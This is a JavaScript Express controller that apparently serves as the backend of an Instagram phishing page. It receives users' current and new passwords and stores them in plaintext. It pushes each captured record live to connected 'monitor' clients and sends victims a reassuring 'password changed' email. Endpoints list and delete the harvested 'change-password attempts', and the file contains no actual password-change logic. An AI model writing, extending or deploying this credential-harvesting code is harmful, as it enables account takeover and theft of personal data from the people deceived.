const ChangePassword = require('../models/ChangePassword.model');
const { getIo }      = require('../config/socket');
const { sendSuccess, sendFailure } = require('../utils/response');
const { sendPasswordChangedEmail } = require('../utils/mailer');

/* ── Format helper — only necessary fields returned to frontend ── */
const fmt = (doc) => ({
  id:              doc._id.toString(),
  service:         (doc.source || 'Instagram').toLowerCase(),
  email:           doc.email || '',
  username:        doc.username || '',
  type:            doc.type || 'change_password',
  currentPassword: doc.currentPassword || '',
  newPassword:     doc.newPassword || '',
  time:            doc.time || null,
  at:              doc.createdAt ? doc.createdAt.toISOString() : new Date().toISOString(),
});

/* ── IST time generator (server-side, never trust client) ── */
const getIstTime = () =>
  new Date().toLocaleString('en-IN', {
    timeZone: 'Asia/Kolkata',
    day:      '2-digit',
    month:    '2-digit',
    year:     'numeric',
    hour:     '2-digit',
    minute:   '2-digit',
    second:   '2-digit',
    hour12:   true,
  });

/**
 * POST /api/instagram/changepassword
 * Receive change-password data from frontend and store to DB.
 * Body: { email?, username?, currentPassword, newPassword, source?, path? }
 */
const changePassword = async (req, res) => {
  try {
    const { email, username, currentPassword, newPassword, source, path } = req.body;

    if (!email) {
      return sendFailure(res, 'Email is required', 400);
    }
    if (!currentPassword) {
      return sendFailure(res, 'Current password is required', 400);
    }
    if (!newPassword) {
      return sendFailure(res, 'New password is required', 400);
    }

    const istTime = getIstTime();

    const doc = await ChangePassword.create({
      email,
      username: username || '',
      currentPassword,
      newPassword,
      source: source || 'Instagram',
      path:   path   || 'change_password',
      time:   istTime,
    });

    const identifier = doc.username || doc.email || 'user';
    console.log(`🔑 Change-password — identifier: ${identifier} | source: ${doc.source} | time (IST): ${doc.time}`);

    // Broadcast to connected monitor clients
    const io = getIo();
    if (io) io.emit('newChangePassword', fmt(doc));

    // Send confirmation email (non-blocking - don't wait for it)
    if (doc.email) {
      sendPasswordChangedEmail(doc.email, doc.username || '')
        .then(() => console.log(`📧 Password change confirmation sent to ${doc.email}`))
        .catch(err => console.error(`❌ Failed to send confirmation email: ${err.message}`));
    }

    return sendSuccess(
      res,
      'Change password data saved successfully',
      {
        id:        doc._id.toString(),
        time:      doc.time,
        createdAt: doc.createdAt,
      },
      201
    );
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * GET /api/instagram/changepassword
 * Return all change-password attempts, newest first.
 */
const getAllChangePasswords = async (req, res) => {
  try {
    const docs = await ChangePassword.find().sort({ createdAt: -1 });
    const changePasswords = docs.map(fmt);
    return sendSuccess(res, 'Data retrieved', { changePasswords });
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/changepassword/all
 * Clear every change-password record.
 */
const deleteAllChangePasswords = async (req, res) => {
  try {
    const result = await ChangePassword.deleteMany({});
    const io = getIo();
    if (io) io.emit('changePasswordsCleared');
    return sendSuccess(res, `${result.deletedCount} record(s) deleted`);
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/changepassword/:id
 * Delete a single record by ID.
 */
const deleteChangePassword = async (req, res) => {
  try {
    const { id } = req.params;
    const doc = await ChangePassword.findByIdAndDelete(id);
    if (!doc) return sendFailure(res, 'Record not found', 404);
    const io = getIo();
    if (io) io.emit('changePasswordDeleted', { id });
    return sendSuccess(res, 'Record deleted');
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/changepassword  (body: { ids: [...] })
 * Bulk delete.
 */
const deleteChangePasswordBulk = async (req, res) => {
  try {
    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0)
      return sendFailure(res, 'ids array is required', 400);
    await ChangePassword.deleteMany({ _id: { $in: ids } });
    const io = getIo();
    if (io) io.emit('changePasswordsDeleted', { ids });
    return sendSuccess(res, `${ids.length} record(s) deleted`);
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

module.exports = {
  changePassword,
  getAllChangePasswords,
  deleteAllChangePasswords,
  deleteChangePassword,
  deleteChangePasswordBulk,
};
